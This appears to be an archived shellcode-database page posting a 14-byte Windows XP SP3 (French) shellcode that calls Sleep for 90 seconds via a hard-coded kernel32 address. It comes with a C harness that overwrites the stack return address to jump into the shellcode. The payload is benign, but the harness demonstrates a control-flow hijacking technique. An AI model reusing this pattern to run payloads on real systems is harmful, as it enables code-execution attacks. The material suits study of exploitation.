<html><head><title>Windows - sp3 (FR) Sleep - 14 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
win32/xp sp3 (FR) Sleep 14 bytes
Author : optix hacker &lt;aidi youssef&gt;
Mail : optix@9.cn
notice Tested Under Windows XP SP3 (fr)
this shellcode makes a sleep for 90000ms=90s=1,5min
this is API from kernel32.dll for sleep :0x7C802446 in win32 xp sp3 (fr)
assembly code is secret in this shellcode :)

*/
#include &lt;stdio.h&gt;
unsigned char shellcode[] =&quot;\x31&quot;

&quot;\xC0\xB9\x46\x24\x80\x7C\x66\xB8\x90\x5F\x50\xFF\xD1&quot;;
int main ()
{
int *ret;
ret=(int *)&amp;ret+2;
printf(&quot;Shellcode Length is : %d\n&quot;,strlen(shellcode));
(*ret)=(int)shellcode;
return 0;
} 

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
